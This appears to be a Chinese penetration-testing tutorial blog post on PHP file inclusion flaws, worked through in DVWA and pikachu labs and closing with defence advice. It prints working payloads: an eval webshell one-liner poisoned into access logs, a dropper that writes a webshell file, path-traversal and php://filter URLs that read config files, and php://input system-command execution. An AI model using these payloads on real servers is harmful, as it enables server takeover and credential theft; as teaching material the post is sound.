---
layout: post
title: 文件包含漏洞
date: 2026-07-12
tags: 文件包含漏洞
description: 深入剖析PHP文件包含漏洞，从LFI/RFI到日志包含、伪协议利用、截断绕过与防御，覆盖DVWA全等级实战。
---

# 文件包含漏洞

## 一、是什么

包含操作在大多数 Web 语言中都会提供，但 PHP 对于包含文件所提供的功能太强大、太灵活，所以包含漏洞经常出现在 PHP 语言中，在其他语言中也可能出现包含漏洞。这也应了一句老话：功能越强大，漏洞就越多。

PHP 中提供了四个包含文件的函数：`include()`、`include_once()`、`require()` 和 `require_once()`。

| 函数 | 行为 |
|------|------|
| `require()` | 目标文件存在错误时，程序中断执行，显示致命错误 |
| `include()` | 目标文件存在错误时，程序不中断，继续执行，显示警告错误 |
| `include_once()` | 先检查目标文件是否已导入过，若是则不再重复导入 |
| `require_once()` | 先检查目标文件是否已导入过，若是则不再重复导入 |

## 二、为什么重要

文件包含漏洞是 Web 安全中危害极大的漏洞类型之一。一旦被利用，攻击者可以：

- **读取任意文件**（配置文件、数据库密码、源码等）
- **远程包含恶意代码**，直接获取服务器控制权
- **配合日志文件**，将一句话木马注入服务器
- **执行系统命令**，对内网进行横向渗透

理解文件包含的每一种利用方式和绕过手法，是渗透测试的基础必修课。

## 三、测试思路 / 前置知识

### 漏洞检测思路

在做代码审计时，如果发现代码中使用了上述四个文件包含函数，且直接引入了用户可控的输入（如 `$_GET`、`$_POST`），那么大概率存在包含漏洞。

最简单的漏洞代码示例：

```php
<?php
$filename = $_GET['filename'];
include($filename);
?>
```

这类代码没有对用户输入做任何过滤，直接传入了 `include()`，属于典型的本地包含漏洞。

### 环境要求

- **LFI（本地文件包含）**：无需额外配置，默认即可利用
- **RFI（远程文件包含）**：需要 `allow_url_include = on` 且 `magic_quotes_gpc = off`

## 四、核心内容

### 4.1 本地文件包含（LFI）

**原理**：通过用户可控的参数，将服务器本地文件路径传入包含函数，从而读取或执行该文件内容。

**前提**：
- 代码中存在 `include/require` 等函数且参数用户可控
- 无需开启 `allow_url_include`

**示例一 —— DVWA 靶场**

打开 DVWA 靶场，登录后将 DVWA Security 设为 `low`，进入 File Inclusion 页面：

![DVWA File Inclusion 首页](/assets/images/13/image-20260712205414253.png)

点击任意一个文件名，发现都是通过 URL 参数请求该文件，这提示可能存在文件包含漏洞：

![URL请求文件](/assets/images/13/image-20260712205451736.png)

在 C 盘下放置了一个 `1.txt`，其中存放了 `12345` 的密码。我们可以用**文件包含**配合**路径穿越**去获取它：

![路径穿越读取C盘文件](/assets/images/13/image-20260712210353506.png)

> 💡 路径穿越的核心思路：通过 `../` 逐级跳出 Web 目录，定位到目标文件。

### 4.2 远程文件包含（RFI）

**原理**：将文件路径替换为远程 URL，服务器会请求并执行远程服务器上的恶意代码。

**前提**：
- `allow_url_include = on`
- `magic_quotes_gpc = off`

直接把文件路径改成具体的 URL 即可：

![远程文件包含](/assets/images/13/image-20260712215620385.png)

### 4.3 包含日志文件

**原理**：服务端通常会对上传的文件进行改名，导致我们上传的 `webshell.php` 无法直接利用。但是，我们对网站的所有操作都会被记录到日志文件中。如果我们携带恶意 payload 访问网站，该 payload 也会写入日志。如果存在文件包含漏洞，通过路径穿越包含日志文件，就能让 PHP 解析其中的恶意代码。

**前提**：
- 目标服务器开启了访问日志
- 存在文件包含漏洞
- 知道日志文件的路径

**常见日志路径**：

| 环境 | 日志路径 |
|------|----------|
| Linux Apache | `/var/log/httpd/access.log` |
| Linux Nginx | `/var/log/nginx/access.log` |
| Linux MySQL | `/var/log/mysql/access.log` |
| phpStudy Apache | `C:\phpStudy\PHPTutorial\Apache\logs\access.log` |
| phpStudy Nginx | `C:\phpStudy\PHPTutorial\nginx\logs` |
| phpStudy MySQL | `C:\phpStudy\PHPTutorial\MySQL\data\xxx.err` |

**phpStudy 开启 Apache 日志**：

打开配置文件 → `httpd-conf` → 取消 `CustomLog "logs/access.log" common` 的注释 → 重启服务。

Apache 服务器运行后会生成两个日志文件：`access.log`（访问日志）和 `error.log`（错误日志）。所有操作都会记录到 `access.log` 中。

正常访问的日志记录：

<img src="/assets/images/13/image-20260713152215958.png" alt="phpStudy配置文件" style="zoom:50%;" />

<img src="/assets/images/13/image-20260713152704370.png" alt="正常访问日志" style="zoom:67%;" />

**步骤一：携带 payload 访问**

```
http://xxx.xxx.xxx/<?php eval($_POST[666]);?>
```

![携带payload访问](/assets/images/13/image-20260713152936317.png)

> ⚠️ 注意：浏览器可能会将特殊符号进行 URL 编码。如果被编码，即使文件包含成功，PHP 编译器也不认识 URL 编码后的内容。此时需要用 Burp Suite 抓包，手动修改被 URL 编码的部分。

**步骤二：BP 抓包，修改 URL 编码**

<img src="/assets/images/13/image-20260713213151685.png" alt="BP抓包修改" style="zoom:50%;" />

查看日志，payload 已成功写入：

![日志写入成功](/assets/images/13/image-20260713213349542.png)

**步骤三：通过文件包含漏洞包含日志文件**

例如，pikachu 靶场的包含点为：

```
C:\tools\phpstudy\PHPTutorial\WWW\pikachu\vul\fileinclude\include
```

路径穿越到日志目录：

```http
http://192.168.239.131/pikachu/vul/fileinclude/fi_local.php?filename=../../../../../Apache/logs/access.log&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
```

成功解析日志中的恶意代码：

<img src="/assets/images/13/image-20260713214137304.png" alt="包含日志成功" style="zoom:67%;" />

**步骤四：蚁剑连接**

用蚁剑连接上述 URL，成功 getshell：

<img src="/assets/images/13/image-20260713215721508.png" alt="蚁剑连接成功" style="zoom:33%;" />

**进阶技巧：通过日志生成一句话木马文件**

有时候直接连接日志可能不太稳定，我们可以在日志中注入代码，让服务器在包含时自动生成一个独立的一句话木马文件：

```php
<?php $file=fopen('jaden.php','w');fputs($file,'<?php @eval($_POST[666]);?>');?>
```

代码含义：生成 `jaden.php` 文件，然后写入 `<?php @eval($_POST[666]);?>`。

![写入payload到日志](/assets/images/13/image-20260713220505722.png)

![生成木马文件成功](/assets/images/13/image-20260713220835916.png)

> 💡 `jaden.php` 是创建在**有文件包含漏洞的目录下**，而不是日志目录。访问路径为：
> `http://192.168.239.131/pikachu/vul/fileinclude/jaden.php`

再用蚁剑连接即可。

### 4.4 PHP 包含读文件

所谓读文件，就是想办法读取某个目录中的某个文件内容。有时候我们实在不能 getshell，可以尝试去读取一些重要文件的内容，比如数据库密码等。

> ⚠️ 为什么要区分**读文件**和**包含文件**？因为如果目标文件中间包含 PHP 代码，那么直接包含时 PHP 代码会被浏览器解析执行，你就看不见原始内容了。

#### 4.4.1 `file:///` 协议

`file:///` 是本地文件系统协议，属于 URL 标准协议之一，作用是让浏览器/程序直接读取本机硬盘文件，不经过网络服务器。

在 DVWA 靶场下找到文件包含漏洞，读取 C 盘下的 `1.txt` 文件内容：

![file协议读取文件](/assets/images/13/image-20260713223109132.png)

> ⚠️ 这种方法只能用于非 `.php` 文件，`php` 文件会被解析执行。

#### 4.4.2 `php://filter` 封装协议

这个协议可以把 `php` 文件内容转换成 Base64 编码，从而防止浏览器解析。

```
http://192.168.239.131:8080/dvwa/vulnerabilities/fi/?
page=php://filter/read=convert.base64-encode/resource=xxx.php
```

示例 —— 读取 DVWA 的配置文件：

```http
http://192.168.239.131/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=../../config/config.inc.php
```

返回 Base64 编码：

![Base64编码返回](/assets/images/13/image-20260713223817132.png)

拿到 Base64 编码后进行解码，即可获得源代码内容。

### 4.5 PHP 包含命令执行

**原理**：利用 `php://input` 伪协议，将 HTTP 请求体中的 PHP 代码直接传入包含函数执行。

**前提**：
- `allow_url_include = on`

**操作步骤**：

构造 URL：

```http
http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://input
```

请求体传入：

```php
<?php system('net user');?>
```

这句话是利用 PHP 代码来执行操作系统指令。执行什么代码都可以，例如：

```php
<?php system('netstat -an');?>
<?php system('ipconfig');?>
```

![php://input命令执行](/assets/images/13/image-20260713225640382.png)

### 4.6 包含截断绕过

**原理**：后端会在用户传入的文件名后自动拼接 `.php` 后缀（如 `include $_GET['page'] . ".php"`），导致我们无法包含 `.txt`、`.jpg` 等非 PHP 文件。利用 `%00` 截断符，可以让 PHP 忽略后面的 `.php` 后缀。

**前提**：
- `magic_quotes_gpc = off`
- PHP 版本 < 5.3.4

漏洞代码示例：

```php
<?php
if(isset($_GET['page'])){
    include $_GET['page'] . ".php";  // 自动拼接 .php 后缀
}else{
    include 'home.php';
}
?>
```

这段代码会将用户传入的参数自动拼接 `.php` 后缀。比如我们传入 `phpinfo.php`，它就会变成 `phpinfo.php.php`，导致无法访问。

**绕过方式**：
- GET 传参使用：`phpinfo.php%00`
- POST 请求使用 16 进制的 `%00`，配合 Burp Suite 自带的 HEX 窗口操作

> 💡 注意：这和 Web 服务程序自身的 `%00` 解析漏洞不一样——那是服务程序的解析漏洞，而这个是程序员代码逻辑上的漏洞。

### 4.7 str_replace 函数绕过

**场景**：DVWA 靶场等级提升到 Medium。

**原理**：`str_replace` 函数只替换一次，可以使用双写绕过。

关键代码：

```php
<?php 
$file = $_GET['page']; 

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file ); 
?>
```

**绕过方式**：`str_replace` 只替换一次，`../` 会被替换掉，但我们写成 `..././`，中间部分被替换后剩下的还是 `../`。

> 💡 这个函数非常不安全，双写即可轻松绕过。

### 4.8 fnmatch 函数绕过

**场景**：DVWA 靶场等级提升到 High。

**原理**：`fnmatch()` 进行文件名模式匹配，只要符合匹配规则即可通过。

关键代码：

```php
<?php 
$file = $_GET['page']; 

if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    echo "ERROR: File not found!";
    exit; 
}
?>
```

代码逻辑：当文件既不是 `include.php`，也不符合 `file*`（文件名以 `file` 开头）时才抛出错误。反过来，只要文件名为 `include.php` 或者以 `file` 开头即可通过检测。

**绕过方式一**：日志注入 + 文件包含，在当前目录下生成一个以 `file` 开头的 PHP 恶意文件。

**绕过方式二**：利用 `file:///` 协议，因为协议名本身以 `file` 开头，符合 `fnmatch("file*")` 的匹配规则：

```http
http://192.168.0.103/dvwa/vulnerabilities/fi/page=file:///C:/xampp/htdocs/dvwa/php.ini
```

### 4.9 PHP 内置协议汇总

PHP 内置了多种 URL 风格的封装协议：

| 协议 | 用途 |
|------|------|
| `file:///` | 访问本地文件系统 |
| `http://` | 访问 HTTP(S) 网址 |
| `ftp://` | 访问 FTP(S) URLs |
| `php://` | 访问各个输入/输出流（I/O streams） |
| `zlib://` | 压缩流 |
| `data://` | 数据（RFC 2397） |
| `ssh2://` | Secure Shell 2 |
| `expect://` | 处理交互式的流 |
| `glob://` | 查找匹配的文件路径模式（老协议） |

## 五、实战案例

以 DVWA 靶场为例，从 Low 到 Impossible，逐级分析绕过思路。

### Low 等级

无任何过滤，直接利用 `page` 参数包含任意文件。LFI、RFI、路径穿越均可直接使用。

### Medium 等级

使用 `str_replace` 过滤 `http://`、`https://`、`../`、`..\"`。

**绕过**：双写绕过（见 [4.7 节](#47-str_replace-函数绕过)）。

### High 等级

使用 `fnmatch()` 限制文件名必须以 `file` 开头或等于 `include.php`。

**绕过**：`file:///` 协议绕过（见 [4.8 节](#48-fnmatch-函数绕过)）。

### Impossible 等级

DVWA 的 Impossible 等级防御代码：

```php
<?php 
$file = $_GET['page']; 

// Only allow include.php or file{1..3}.php
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
    echo "ERROR: File not found!";
    exit; 
}
?>
```

使用了**严格的白名单限制**，只允许白名单上明确列出的几个文件，把攻击面彻底封死。

## 六、总结

### 攻击手法汇总

| 利用方式 | 适用场景 | 前提条件 | 绕过要点 |
|----------|---------|----------|---------|
| 本地文件包含（LFI） | 读取/执行本地文件 | 无 | 路径穿越 `../` |
| 远程文件包含（RFI） | 包含远程恶意文件 | `allow_url_include=on` | 远程托管恶意 PHP 文件 |
| 日志文件包含 | 上传文件被改名时 | 日志可访问 + 知道路径 | 携带 payload 访问 → 包含日志 |
| `file:///` 协议 | 读取非 PHP 文件 | 无 | 绝对路径 |
| `php://filter` | 读取 PHP 源码 | 无 | Base64 编码输出后解码 |
| `php://input` | 命令执行 | `allow_url_include=on` | POST 请求体传 PHP 代码 |
| `%00` 截断 | 绕过自动拼接后缀 | `magic_quotes_gpc=off` + PHP < 5.3.4 | `%00` 截断后续字符串 |
| `str_replace` 双写 | 绕过字符串替换过滤 | 无 | `..././` → 替换后 → `../` |
| `fnmatch` 绕过 | 绕过文件名模式匹配 | 无 | `file:///` 协议 / 生成 file 开头文件 |

### 防护建议

1. **白名单限制**：只允许包含明确指定的文件（如 DVWA Impossible 等级的做法）
2. **关闭危险配置**：`allow_url_include = off`，`allow_url_fopen = off`
3. **升级 PHP 版本**：使用最新版 PHP，修复 `%00` 截断等历史漏洞
4. **路径硬编码**：不要将用户输入直接拼接到包含路径中
5. **限制日志文件权限**：防止未授权读取访问日志
6. **禁用不必要的伪协议**：如无业务需求，可以禁用 `php://input` 等协议

---

*参考环境：DVWA、pikachu、phpStudy*
